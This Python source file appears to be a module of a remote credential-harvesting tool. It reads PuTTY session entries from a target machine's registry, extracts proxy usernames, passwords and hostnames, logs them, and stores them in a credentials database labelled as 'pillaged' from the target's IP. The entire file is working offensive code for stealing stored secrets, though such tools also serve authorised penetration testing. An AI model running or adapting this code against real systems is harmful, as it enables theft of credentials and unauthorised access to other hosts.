# Code based on vncpasswd.py by trinitronx
# https://github.com/trinitronx/vncpasswd.py
import binascii
import codecs
import traceback

from . import d3des as d

from lib.toolbox import bcolors


# from lazagne.config.winstructure import *


class Putty():
    def __init__(self,smb, myregops, myfileops, logger, options, db):
        self.myregops = myregops
        self.myfileops = myfileops
        self.logging = logger
        self.options = options
        self.db = db
        self.smb = smb


    def putty_from_registry(self):
        pfound = []
        puttys = (
            ('Putty', 'HKCU\\Software\\SimonTatham\\PuTTY\\Sessions'),
            #('WinSCP', 'Software\\Martin Prikryl\\WinSCP 2\\Configuration', 'Security'),
        )

        for putty in puttys:
            try:
                reg_sessions = self.myregops.get_reg_subkey(putty[1])
                for reg_session in reg_sessions:
                    self.logging.debug(f'Found Putty session : {reg_session}')
                    ProxyPassword=self.myregops.get_reg_value(reg_session, 'ProxyPassword')[1]
                    HostName=self.myregops.get_reg_value(reg_session, 'HostName')[1]
                    ProxyUsername=self.myregops.get_reg_value(reg_session, 'ProxyUsername')[1]
                    self.logging.info(
                    f"[{self.options.target_ip}] Found Putty Proxy : {bcolors.OKBLUE}{ProxyUsername}:{ProxyPassword}@{HostName}{bcolors.ENDC} ")
                    ############PROCESSING DATA
                    self.db.add_credz(credz_type='Putty',
                                      credz_username=ProxyUsername,
                                      credz_password=ProxyPassword,
                                      credz_target=HostName,
                                      credz_path='',
                                      pillaged_from_computer_ip=self.options.target_ip,
                                      pillaged_from_username='')
            except Exception:
                self.logging.debug(f'Problems with putty : {putty}')
                continue
        return pfound


    def run(self):
        return self.putty_from_registry() 
